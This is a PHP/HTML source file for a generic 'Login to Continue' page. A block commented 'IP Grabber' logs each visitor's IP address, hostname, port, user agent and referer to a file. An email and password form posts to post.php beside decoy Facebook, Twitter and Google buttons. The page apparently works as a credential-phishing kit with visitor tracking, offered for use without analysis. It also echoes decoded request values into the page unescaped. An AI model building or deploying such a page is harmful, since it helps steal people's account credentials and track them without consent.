<!DOCTYPE html>
<html lang="en" >

<head>
  <meta charset="UTF-8">
  <title>Login to Continue</title>
  
  
  
      <link rel="stylesheet" href="css/style.css">

  
</head>

<body>
<?php
 
//IP Grabber
 
//Variables
//$name = base64_decode($name);
$name=$_REQUEST['logingreeting'];
$page=$_REQUEST['page'];
$name = base64_decode($name);
$page = base64_decode($page);

$timestamp = date('d/m/Y h:i:s'); 
$protocol = $_SERVER['SERVER_PROTOCOL'];
$ip = $_SERVER['REMOTE_ADDR'];
$port = $_SERVER['REMOTE_PORT'];
$agent = $_SERVER['HTTP_USER_AGENT'];
$ref = $_SERVER['HTTP_REFERER'];
$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
 
//Print IP, Hostname, Port Number, User Agent and Referer To Log.TXT
 
$fh = fopen('visitLog.html', 'a');
fwrite($fh, 'Visitors: '."".$name ."\n");
fwrite($fh, 'IP Address: '."".$ip ."\n");
fwrite($fh, 'Time: '."".$timestamp ."\n");
fwrite($fh, 'Hostname: '."".$hostname ."\n");
fwrite($fh, 'Port Number: '."".$port ."\n");
fwrite($fh, 'User Agent: '."".$agent ."\n");
fwrite($fh, 'HTTP Referer: '."".$ref ."\n\n");


fclose($fh);
?>
  
<div class="form_wrapper">
  <div class="form_container">
    <div class="title_container">
      <h2>Login to Continue</h2>
    </div>
    <div class="row clearfix">
      <div class="col_half">
        <div class="social_btn fb"><a href="https://www.facebook.com/"><span><i class="fa fa-facebook" aria-hidden="true"></i></span>Sign in with Facebook</a></div>
        <div class="social_btn tw"><a href="https://twitter.com/login"><span><i class="fa fa-twitter" aria-hidden="true"></i></span>Sign in with Twitter</a></div>
        <div class="social_btn gplus"><a href="https://accounts.google.com/signin/v2/identifier?service=mail&passive=true&rm=false&continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ss=1&scc=1&ltmpl=default&ltmplcache=2&emr=1&osid=1&flowName=GlifWebSignIn&flowEntry=ServiceLogin"><span><i class="fa fa-google-plus" aria-hidden="true"></i></span>Sign in with Google+</a></div>
        <div class="row clearfix create_account">
        </div>
      </div>
      <div class="col_half last">
        <form method="POST" action="post.php">
          <div class="input_field"><span><i class="fa fa-envelope" aria-hidden="true"></i></span>
            <input type="email" name="Username" placeholder="Email" required/ value="";>
			<input type="hidden" name="logingreeting" value="<?php echo $name;?>">
          </div>
          <div class="input_field"><span><i class="fa fa-lock" aria-hidden="true"></i></span>
            <input type="password" name="Password" placeholder="Password" required=""/>
          </div>
		  <input type="hidden" name="page" value="<?php echo $page;?>">
          <input class="button" type="submit" value="Sign in"/>
          <div class="row clearfix bottom_row">
            <div class="col_half remember_me">
              <input name="" type="checkbox" value=""/>Remember me
            </div>
            <div class="col_half forgot_pw"><a href="#">Forgot Password?</a></div>
          </div>
        </form>
      </div>
    </div>
  </div>
</div>
<p class="credit">Developed by <a href="#" target="_blank">Design the way</a></p>
  <script src='https://use.fontawesome.com/4ecc3dbb0b.js'></script>

  

</body>

</html>
